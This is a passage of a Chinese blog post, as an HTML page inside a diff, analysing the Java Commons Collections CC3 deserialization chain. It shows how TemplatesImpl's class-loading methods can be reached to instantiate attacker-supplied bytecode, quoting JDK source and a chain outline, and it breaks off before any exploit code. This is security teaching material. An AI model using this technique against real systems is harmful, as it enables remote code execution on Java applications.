@@ -1,0 +1,822 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  java反序列化之CC3
+  #
+
+
+  CC3 简介
+  #
+
+CC3 和之前的 CC1 和 CC6 有很大区别，CC1 和 CC6 是通过Runtime.exec()进行命令执行的，很多时候代码中会 ban 了Runtime。
+而在 CC3 中，是通过动态类加载机制实现自动执行恶意类代码的。
+下面再回顾以下 java 动态类加载机制。
+
+  TemplatesImpl 解析
+  #
+
+在我之前动态类加载的博客中有讲过利用ClassLoader#defineClass直接加载字节码的方法。在这一条链子中，简单说就是调用ClassLoader.loadClass()，然后会调用ClassLoader.findClass()，然后会调用ClassLoader.defineClass()。
+这里从正向看这个链子，首先loadClass()，作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没有找到的情况下执行findClass()。findClass()这个方法根据名称或位置加载 class 字节码，然后调用defineClass()。findClass()这个方法通常会由子类实现。
+defineClass()的作用是处理前面传入的字节码，把字节码转化成真正的 java 类。而此时的defineClass()是有局限性的，因为只加载类，并不执行类。若需要执行，则需要先进行newInstance()实例化。
+ClassLoader的defineClass()方法的作用域为protected，我们需要找到作用域为public的类方便使用。
+在TemplatesImpl类的静态内部类TransletClassLoader中找到了我们能够运用的defineClass。
+Class defineClass(final byte[] b) {
+            return defineClass(null, b, 0, b.length);
+        }
+这里的defineClass()没有标注作用域，默认为包级私有，在自己的类里可以调用。继续查找用法。
+在TemplatesImpl的defineTransletClasses方法中找到了调用，这个方法是私有的，找一下谁调用了defineTransletClasses。
+还是同一个类下的getTransletInstance()方法调用了defineTransletClasses：
+private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();  //调用点
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setServicesMechnism(_useServicesMechanism);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+这里同时还有一个newInstance()实例化的过程，如果能走完这个函数就能动态执行代码，但是因为是私有的，得继续找。"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="java反序列化之CC3"><meta property="og:description" content="java反序列化之CC3 # CC3 简介 # CC3 和之前的 CC1 和 CC6 有很大区别，CC1 和 CC6 是通过Runtime.exec()进行命令执行的，很多时候代码中会 ban 了Runtime。
+而在 CC3 中，是通过动态类加载机制实现自动执行恶意类代码的。
+下面再回顾以下 java 动态类加载机制。
+TemplatesImpl 解析 # 在我之前动态类加载的博客中有讲过利用ClassLoader#defineClass直接加载字节码的方法。在这一条链子中，简单说就是调用ClassLoader.loadClass()，然后会调用ClassLoader.findClass()，然后会调用ClassLoader.defineClass()。
+这里从正向看这个链子，首先loadClass()，作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没有找到的情况下执行findClass()。findClass()这个方法根据名称或位置加载 class 字节码，然后调用defineClass()。findClass()这个方法通常会由子类实现。
+defineClass()的作用是处理前面传入的字节码，把字节码转化成真正的 java 类。而此时的defineClass()是有局限性的，因为只加载类，并不执行类。若需要执行，则需要先进行newInstance()实例化。
+ClassLoader的defineClass()方法的作用域为protected，我们需要找到作用域为public的类方便使用。
+在TemplatesImpl类的静态内部类TransletClassLoader中找到了我们能够运用的defineClass。
+Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } 这里的defineClass()没有标注作用域，默认为包级私有，在自己的类里可以调用。继续查找用法。
+在TemplatesImpl的defineTransletClasses方法中找到了调用，这个方法是私有的，找一下谁调用了defineTransletClasses。
+还是同一个类下的getTransletInstance()方法调用了defineTransletClasses：
+private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); //调用点 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 这里同时还有一个newInstance()实例化的过程，如果能走完这个函数就能动态执行代码，但是因为是私有的，得继续找。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-05-14T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-14T00:00:00+00:00"><meta property="article:tag" content="Java安全"><meta property="article:tag" content="反序列化专题"><meta property="article:tag" content="CC链"><title>java反序列化之CC3 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle checked>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/ class=active>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>java反序列化之CC3</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#cc3-简介>CC3 简介</a></li><li><a href=#templatesimpl-解析>TemplatesImpl 解析</a></li><li><a href=#templatesimpl-利用>TemplatesImpl 利用</a></li><li><a href=#cc1-链的-templatesimpl-实现方法>CC1 链的 TemplatesImpl 实现方法</a></li><li><a href=#cc6-链的-templatesimpl-的实现方式>CC6 链的 TemplatesImpl 的实现方式</a></li><li><a href=#cc3-链>CC3 链</a><ul><li><a href=#cc3-链分析>CC3 链分析</a></li><li><a href=#构造-exp>构造 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java反序列化之cc3>java反序列化之CC3
+<a class=anchor href=#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc3>#</a></h1><h2 id=cc3-简介>CC3 简介
+<a class=anchor href=#cc3-%e7%ae%80%e4%bb%8b>#</a></h2><p>CC3 和之前的 CC1 和 CC6 有很大区别，CC1 和 CC6 是通过<code>Runtime.exec()</code>进行命令执行的，很多时候代码中会 ban 了<code>Runtime</code>。</p><p>而在 CC3 中，是通过动态类加载机制实现自动执行<strong>恶意类代码</strong>的。</p><p>下面再回顾以下 java 动态类加载机制。</p><h2 id=templatesimpl-解析>TemplatesImpl 解析
+<a class=anchor href=#templatesimpl-%e8%a7%a3%e6%9e%90>#</a></h2><p>在我之前动态类加载的博客中有讲过利用<code>ClassLoader#defineClass</code>直接加载字节码的方法。在这一条链子中，简单说就是调用<code>ClassLoader.loadClass()</code>，然后会调用<code>ClassLoader.findClass()</code>，然后会调用<code>ClassLoader.defineClass()</code>。</p><p>这里从正向看这个链子，首先<code>loadClass()</code>，作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没有找到的情况下执行<code>findClass()</code>。<code>findClass()</code>这个方法根据名称或位置加载 class 字节码，然后调用<code>defineClass()</code>。<code>findClass()</code>这个方法通常会由子类实现。</p><p><code>defineClass()</code>的作用是处理前面传入的字节码，把字节码转化成真正的 java 类。而此时的<code>defineClass()</code>是有局限性的，因为只加载类，并不执行类。若需要执行，则需要先进行<code>newInstance()</code>实例化。</p><p><code>ClassLoader</code>的<code>defineClass()</code>方法的作用域为<code>protected</code>，我们需要找到作用域为<code>public</code>的类方便使用。</p><p>在<code>TemplatesImpl</code>类的静态内部类<code>TransletClassLoader</code>中找到了我们能够运用的<code>defineClass</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>Class <span style=color:#a6e22e>defineClass</span>(<span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> defineClass(<span style=color:#66d9ef>null</span>, b, 0, b.<span style=color:#a6e22e>length</span>);
+</span></span><span style=display:flex><span>        }
+</span></span></code></pre></div><p>这里的<code>defineClass()</code>没有标注作用域，默认为包级私有，在自己的类里可以调用。继续查找用法。</p><p>在<code>TemplatesImpl</code>的<code>defineTransletClasses</code>方法中找到了调用，这个方法是私有的，找一下谁调用了<code>defineTransletClasses</code>。</p><p>还是同一个类下的<code>getTransletInstance()</code>方法调用了<code>defineTransletClasses</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span>()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) defineTransletClasses();  <span style=color:#75715e>//调用点</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// The translet needs to keep a reference to all its auxiliary</span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// class to prevent the GC from collecting them</span>
+</span></span><span style=display:flex><span>            AbstractTranslet translet <span style=color:#f92672>=</span> (AbstractTranslet) _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>]</span>.<span style=color:#a6e22e>newInstance</span>();
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>postInitialization</span>();
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setTemplates</span>(<span style=color:#66d9ef>this</span>);
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setServicesMechnism</span>(_useServicesMechanism);
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setAllowedProtocols</span>(_accessExternalStylesheet);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                translet.<span style=color:#a6e22e>setAuxiliaryClasses</span>(_auxClasses);
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> translet;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (InstantiationException e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IllegalAccessException e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>这里同时还有一个<code>newInstance()</code>实例化的过程，如果能走完这个函数就能动态执行代码，但是因为是私有的，得继续找。</p><p>同一个类下的<code>newTransformer()</code>方法中调用了<code>getTransletInstance()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Transformer <span style=color:#a6e22e>newTransformer</span>()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        TransformerImpl transformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerImpl(getTransletInstance(), _outputProperties,
+</span></span><span style=display:flex><span>            _indentNumber, _tfactory);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_uriResolver <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            transformer.<span style=color:#a6e22e>setURIResolver</span>(_uriResolver);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_tfactory.<span style=color:#a6e22e>getFeature</span>(XMLConstants.<span style=color:#a6e22e>FEATURE_SECURE_PROCESSING</span>)) {
+</span></span><span style=display:flex><span>            transformer.<span style=color:#a6e22e>setSecureProcessing</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> transformer;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>这是一个公有方法，接下来开始利用。</p><h2 id=templatesimpl-利用>TemplatesImpl 利用
+<a class=anchor href=#templatesimpl-%e5%88%a9%e7%94%a8>#</a></h2><p>上面我们分析过，只要能走到<code>getTransletInstance()</code>方法即可，因为内部调用了<code>newInstance()</code>方法，接下来只要满足一系列限制条件就能利用。</p><p>下面先把利用链写出来，然后对着利用链逐条满足限制：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>TemplatesImpl#newTransformer() -&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-&gt; TransletClassLoader#defineClass()
+</span></span></code></pre></div><p>首先是<code>getTransletInstance()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span>()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) defineTransletClasses();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// The translet needs to keep a reference to all its auxiliary</span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// class to prevent the GC from collecting them</span>
+</span></span><span style=display:flex><span>            AbstractTranslet translet <span style=color:#f92672>=</span> (AbstractTranslet) _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>]</span>.<span style=color:#a6e22e>newInstance</span>();
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>postInitialization</span>();
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setTemplates</span>(<span style=color:#66d9ef>this</span>);
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setServicesMechnism</span>(_useServicesMechanism);
+</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setAllowedProtocols</span>(_accessExternalStylesheet);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                translet.<span style=color:#a6e22e>setAuxiliaryClasses</span>(_auxClasses);
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> translet;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (InstantiationException e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IllegalAccessException e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
